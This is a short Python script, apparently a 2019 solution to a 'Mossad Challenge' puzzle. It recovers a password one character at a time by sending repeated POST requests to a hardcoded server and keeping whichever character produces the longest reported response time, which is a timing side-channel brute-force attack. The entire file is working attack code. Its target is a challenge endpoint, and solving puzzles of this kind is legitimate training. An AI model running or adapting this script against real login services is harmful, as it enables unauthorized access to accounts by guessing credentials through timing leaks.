# --------------------------------------------------------
# Program by ADV-IT
#  POST Requests Brute Force for Mossad Challenge#1 2019
#
# Version      Date           Info
# 1.0          11-May-2019    Initial Version
#
# -------------------------------------------------------

import requests

CHARACTERS = "abcdefghijklmnopqrstuvwxyz0123456789"
URL        = "http://35.246.158.51:8070/auth/v1_1"
HEADERS    = {'User-Agent' : 'ed9ae2c0-9b15-4556-a393-23d500675d4b', 'content-type' : 'application/json; charset=utf-8' }

PAYLOAD ={}

isValid  = "False"
password = ""

while(str(isValid) == "False"):
    maxdelay = 0
    for i in range(len(CHARACTERS)):
        PAYLOAD['Seed']     = "e1640d2b4f49432db4ac2c23b2f93630"
        PAYLOAD['Password'] = password + CHARACTERS[i]
        r = requests.post(url=URL, json=PAYLOAD, headers=HEADERS)
        result = r.json()
        delay   = result['Time']
        lockurl = result['LockURL']
        isValid = result['IsValid']
        print(str(PAYLOAD) + " - " + str(delay) + " - " + str(isValid) + " -> " + str(lockurl))
        if delay > maxdelay:
            maxdelay = delay
            correct_char = CHARACTERS[i]
        if str(isValid) != "False":
            break
    password = password + correct_char
    print("Max deley       : " + str(maxdelay))
    print("Currect Password: " + password)
